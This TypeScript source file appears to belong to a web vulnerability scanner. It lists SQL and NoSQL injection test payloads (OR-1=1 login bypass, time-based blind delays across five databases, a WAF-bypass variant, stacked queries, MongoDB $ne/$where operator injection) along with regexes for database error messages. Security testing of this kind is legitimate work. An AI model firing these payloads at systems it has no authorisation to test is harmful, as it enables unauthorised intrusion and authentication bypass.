/** SQL injection test payloads — error-based, non-destructive detection only */
export const SQLI_PAYLOADS = [
  // Classic string-based
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',

  // Numeric-based
  '1 OR 1=1',
  '1 OR 1=1--',
  '1; SELECT 1--',

  // Error-based
  "' AND 1=CONVERT(int, @@version)--",
  "' UNION SELECT NULL--",
];

export interface TimedSqliPayload {
  payload: string;
  dbType: 'mysql' | 'mssql' | 'postgres' | 'sqlite' | 'oracle' | 'generic';
}

/** Time-based blind SQLi payloads — separated so we can measure response timing.
 *  Uses 5-second delays to reliably exceed BLIND_SQLI_THRESHOLD_MS (3500ms)
 *  while leaving 1.5s margin for network latency. */
export const SQLI_TIME_PAYLOADS: TimedSqliPayload[] = [
  // MySQL — multiple contexts (string, numeric, subquery)
  { payload: "' OR SLEEP(5)--", dbType: 'mysql' },
  { payload: "1 OR SLEEP(5)--", dbType: 'mysql' },
  { payload: "1 OR SLEEP(5)#", dbType: 'mysql' },
  { payload: "1 AND SLEEP(5)--", dbType: 'mysql' },
  { payload: "' OR (SELECT SLEEP(5))--", dbType: 'mysql' },
  // MySQL conditional — more precise: delay ONLY when injection works
  { payload: "' OR IF(1=1,SLEEP(5),0)--", dbType: 'mysql' },
  { payload: "1 OR IF(1=1,SLEEP(5),0)--", dbType: 'mysql' },
  { payload: "' AND (SELECT IF(1=1,SLEEP(5),0))--", dbType: 'mysql' },
  // MySQL inline-comment WAF bypass
  { payload: "1 /*!50000OR*/ SLEEP(5)--", dbType: 'mysql' },
  // MSSQL
  { payload: "1; WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
  { payload: "'; WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
  // MSSQL conditional
  { payload: "'; IF(1=1) WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
  { payload: "1; IF(1=1) WAITFOR DELAY '0:0:5'--", dbType: 'mssql' },
  // PostgreSQL
  { payload: "'; SELECT pg_sleep(5)--", dbType: 'postgres' },
  { payload: "1; SELECT pg_sleep(5)--", dbType: 'postgres' },
  // PostgreSQL conditional
  { payload: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", dbType: 'postgres' },
  { payload: "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", dbType: 'postgres' },
  // Oracle — DBMS_PIPE.RECEIVE_MESSAGE is available without DBA privileges
  { payload: "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", dbType: 'oracle' },
  { payload: "1 OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", dbType: 'oracle' },
  // SQLite (no sleep, but heavy computation)
  { payload: "1 OR 1=1 AND RANDOMBLOB(500000000)--", dbType: 'sqlite' },
];

/** SQL error signatures indicating injection vulnerability */
export const SQL_ERROR_PATTERNS = [
  // MySQL / MariaDB
  /you have an error in your sql syntax/i,
  /SQL syntax.*?MySQL/i,
  /Warning.*?\Wmysqli?_/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /MariaDB server version/i,

  // PostgreSQL
  /PostgreSQL.*?ERROR/i,
  /pg_query/i,
  /pg_exec/i,
  /psycopg2\./i,
  /PG::SyntaxError/i,
  /unterminated string literal/i,

  // Microsoft SQL Server
  /unclosed quotation mark/i,
  /microsoft ole db provider/i,
  /Microsoft SQL Native Client/i,
  /\bODBC SQL Server Driver\b/i,
  /SQL Server.*?\d{4,}/i,

  // Oracle
  /ORA-\d{5}/,
  /quoted string not properly terminated/i,
  /oracle\.jdbc/i,
  /XMLDOM/i,

  // SQLite
  /sqlite3?\.OperationalError/i,
  /SQLite\/JDBCDriver/i,
  /unrecognized token/i,

  // Generic
  /SQLSTATE\[\w+\]/,
  /SQL command not properly ended/i,
  /invalid input syntax for/i,
  /Dynamic SQL Error/i,
  /unexpected end of SQL command/i,
];

/** Boolean-based blind SQLi payload pairs — compare true vs false condition */
export const SQLI_BOOLEAN_PAYLOADS: Array<{ truePayload: string; falsePayload: string }> = [
  { truePayload: "' OR '1'='1", falsePayload: "' OR '1'='2" },
  { truePayload: '1 OR 1=1', falsePayload: '1 OR 1=2' },
  { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
  // Subquery CASE WHEN — bypasses simple OR/AND filtering
  { truePayload: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--", falsePayload: "' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--" },
  { truePayload: "1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1--", falsePayload: "1 AND (SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1--" },
];

/** Stacked query SQLi payloads — test multi-statement execution.
 *  Stacked queries are critical for RCE on MSSQL (xp_cmdshell) and PostgreSQL (COPY TO).
 *  These use timing to confirm execution of a second statement after a semicolon. */
export interface StackedSqliPayload {
  payload: string;
  dbType: 'mysql' | 'mssql' | 'postgres' | 'generic';
  technique: string;
}

export const SQLI_STACKED_PAYLOADS: StackedSqliPayload[] = [
  // MSSQL — native stacked query support, most dangerous
  { payload: "'; WAITFOR DELAY '0:0:5'; --", dbType: 'mssql', technique: 'mssql-stacked-waitfor' },
  { payload: "1; WAITFOR DELAY '0:0:5'; --", dbType: 'mssql', technique: 'mssql-stacked-waitfor-numeric' },
  { payload: "'; DECLARE @x INT; WAITFOR DELAY '0:0:5'; --", dbType: 'mssql', technique: 'mssql-stacked-declare-waitfor' },
  { payload: "1; DECLARE @x INT; SET @x=1; WAITFOR DELAY '0:0:5'; --", dbType: 'mssql', technique: 'mssql-stacked-multi-statement' },
  // PostgreSQL — supports stacked queries natively
  { payload: "'; SELECT pg_sleep(5); --", dbType: 'postgres', technique: 'pg-stacked-sleep' },
  { payload: "1; SELECT pg_sleep(5); --", dbType: 'postgres', technique: 'pg-stacked-sleep-numeric' },
  { payload: "'; CREATE TEMP TABLE IF NOT EXISTS secbot_test(id int); SELECT pg_sleep(5); --", dbType: 'postgres', technique: 'pg-stacked-create-sleep' },
  // MySQL — stacked queries usually blocked (multi_query=false), but some configs allow it
  { payload: "'; SELECT SLEEP(5); --", dbType: 'mysql', technique: 'mysql-stacked-sleep' },
  { payload: "1; SELECT SLEEP(5); --", dbType: 'mysql', technique: 'mysql-stacked-sleep-numeric' },
  // Generic — portable stacked query tests
  { payload: "'; SELECT 1; SELECT SLEEP(5); --", dbType: 'generic', technique: 'generic-dual-stacked' },
  { payload: "1; SELECT 1; --", dbType: 'generic', technique: 'generic-stacked-select' },
];

/** Union-based SQLi detection — ORDER BY probes to find column count */
export const SQLI_UNION_ORDER_BY_PROBES = Array.from({ length: 10 }, (_, i) => `' ORDER BY ${i + 1}--`);

/** NoSQL injection payloads */
export const NOSQL_PAYLOADS = [
  // Operator injection — query parameter overrides
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"$regex": ".*"}',
  '[$ne]=1',
  '[$gt]=',
  // $where JavaScript context injection
  "true, $where: '1 == 1'",
  "'; return true; var a='",
  '1; return true; var a=1',
  "'; return '' == '",
  // $or operator bypass (JSON body)
  '{"$or": [{"a": 1}, {"b": 1}]}',
  // $exists probe
  '[$exists]=true',
];

/** NoSQL timing payloads — $where JavaScript sleep for time-based blind */
export interface NoSqlTimingPayload {
  payload: string;
  delay: number;
}

export const NOSQL_TIMING_PAYLOADS: NoSqlTimingPayload[] = [
  { payload: "'; sleep(5000); var a='", delay: 5 },
  { payload: '1; sleep(5000); var a=1', delay: 5 },
  { payload: '{"$where": "sleep(5000)"}', delay: 5 },
];

/**
 * NoSQL JSON body payloads — MongoDB operator injection for JSON API endpoints.
 * These target the common pattern where Express/Mongoose deserializes JSON bodies
 * directly into MongoDB queries. Each payload replaces a string field value with
 * an operator object (e.g., { "username": { "$ne": null } }).
 */
export interface NoSqlJsonPayload {
  /** Raw JSON string for the field value (replaces the normal string value) */
  valueJson: string;
  technique: string;
  description: string;
}

export const NOSQL_JSON_PAYLOADS: NoSqlJsonPayload[] = [
  // Authentication bypass — $ne (not equal) always matches
  { valueJson: '{"$ne":null}', technique: 'ne-null-bypass', description: 'MongoDB $ne null — matches any non-null document' },
  { valueJson: '{"$ne":""}', technique: 'ne-empty-bypass', description: 'MongoDB $ne empty — matches all non-empty values' },
  // $gt (greater than) — always matches strings
  { valueJson: '{"$gt":""}', technique: 'gt-empty-bypass', description: 'MongoDB $gt empty — matches all strings' },
  // $regex — universal match
  { valueJson: '{"$regex":".*"}', technique: 'regex-wildcard', description: 'MongoDB $regex .* — matches any string value' },
  { valueJson: '{"$regex":"^a"}', technique: 'regex-prefix-probe', description: 'MongoDB $regex prefix — probes for values starting with "a"' },
  // $exists — check field existence (info disclosure)
  { valueJson: '{"$exists":true}', technique: 'exists-probe', description: 'MongoDB $exists — tests if field contains any value' },
  // $where — JavaScript evaluation (critical if unpatched)
  { valueJson: '{"$where":"return true"}', technique: 'where-js-eval', description: 'MongoDB $where JavaScript — server-side JS execution' },
  // $or — query logic bypass
  { valueJson: '{"$or":[{"a":1},{"b":1}]}', technique: 'or-bypass', description: 'MongoDB $or — injects alternative match conditions' },
];

/** NoSQL error signatures */
export const NOSQL_ERROR_PATTERNS = [
  /MongoServerError|MongoError|BSONTypeError/i,
  /cast to ObjectId failed|BSONTypeError/i,
  /mongoose.*validation.*failed/i,
  /E11000 duplicate key error/i,
  // MongoDB JavaScript execution errors ($where context)
  /SyntaxError.*\$where/i,
  /\$where.*not allowed/i,
  // CouchDB
  /couchdb.*error/i,
  // Redis
  /ERR wrong number of arguments/i,
  /WRONGTYPE Operation against/i,
];
